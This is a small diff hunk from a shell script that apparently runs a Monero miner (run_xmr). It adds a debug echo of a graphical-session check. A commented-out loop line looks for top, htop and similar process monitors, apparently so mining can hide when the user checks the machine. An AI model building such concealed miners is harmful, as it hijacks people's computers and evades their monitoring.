@@ -18,7 +18,7 @@ run_xmr() {
 
 main() {
 	isUI=$(who | grep -q "(:[0-9])" && echo 1 || echo 0)
-
+	echo "isUI: $isUI"
 	while true; do 
 		sleep 1
 		# if pgrep -x "top" || pgrep -x "htop" || pgrep -x "atop" || pgrep -x "mate-system-mon"; then
